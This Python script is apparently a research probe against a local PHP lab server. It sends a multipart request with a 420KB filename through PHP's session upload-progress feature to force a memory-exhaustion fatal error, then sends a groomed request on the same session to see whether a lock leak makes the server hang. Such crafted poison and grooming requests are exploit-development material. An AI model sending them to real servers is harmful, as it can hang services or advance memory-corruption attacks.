#!/usr/bin/env python3
"""Discriminator: does a same-SID consumer hang after a poison EVEN WITHOUT any
stale-global producer before it? (flock test)
S1: poison SID V (420KB name => fatal after first flush).
S2: consumer on SID V (small groom) on the SAME worker.
If S2 hangs => flock leak (mechanical). If S2 clean => P3's hang was stale-consumption."""
import socket, re

HOST, PORT = "127.0.0.1", 8083
B = b"GLM619"
SID_V = b"1234567890abcdef1234567890abcdef"

def part(name, body, filename=None):
    d = b"--" + B + b"\r\n" + b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    return d + b"\r\nContent-Type: text/plain\r\n\r\n" + body + b"\r\n"

def pb(parts): return b"".join(parts) + b"--" + B + b"--\r\n"

def post_head(blen):
    return (f"POST /lab/index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
            f"Content-Type: multipart/form-data; boundary={B.decode()}\r\n"
            f"Content-Length: {blen}\r\nConnection: keep-alive\r\n\r\n").encode()

class KA:
    def __init__(self): self.s = socket.create_connection((HOST, PORT), timeout=30)
    def send(self, head, body=None, timeout=60):
        t0 = __import__("time").time()
        self.s.sendall(head if body is None else head + body)
        self.s.settimeout(timeout)
        buf = b""
        while True:
            he = buf.find(b"\r\n\r\n")
            if he >= 0:
                m = re.search(rb"Content-Length: (\d+)", buf[:he])
                if m and len(buf) >= he + 4 + int(m.group(1)): return buf, __import__("time").time() - t0
            try: d = self.s.recv(65536)
            except socket.timeout: return buf + b"\n<TIMEOUT>", __import__("time").time() - t0
            except ConnectionResetError: return buf + b"\n<RESET>", __import__("time").time() - t0
            if not d: return buf + b"\n<EOF>", __import__("time").time() - t0
            buf += d
    def close(self):
        try: self.s.close()
        except Exception: pass

ka = KA()
p1 = pb([part(b"PHPSESSID", SID_V), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"keyV"),
         part(b"u", b"x" * 100, filename=b"G" * (420 * 1024))])
r, dt = ka.send(post_head(len(p1)), p1, timeout=90)
mm = re.search(rb"tried to allocate (\d+)", r)
print(f"[poison V] fatal={b'Allowed memory' in r} alloc={mm.group(1).decode() if mm else '-'} t={dt:.1f}s", flush=True)

cons = []
for i in range(10):
    cons.append(part(f"s{i}".encode(), (b"U%02d" % i).ljust(193, b"Q")))
cons.append(part(b"PHPSESSID", SID_V))
cons.append(part(b"PHP_SESSION_UPLOAD_PROGRESS", b"keyC"))
cons.append(part(b"u", b"y", filename=b"a.txt"))
c = pb(cons)
r, dt = ka.send(post_head(len(c)), c, timeout=60)
print(f"[same-SID consumer] rawlen={len(r)} fatal={b'Allowed memory' in r} t={dt:.1f}s body={r[:120]!r}", flush=True)
ka.close()
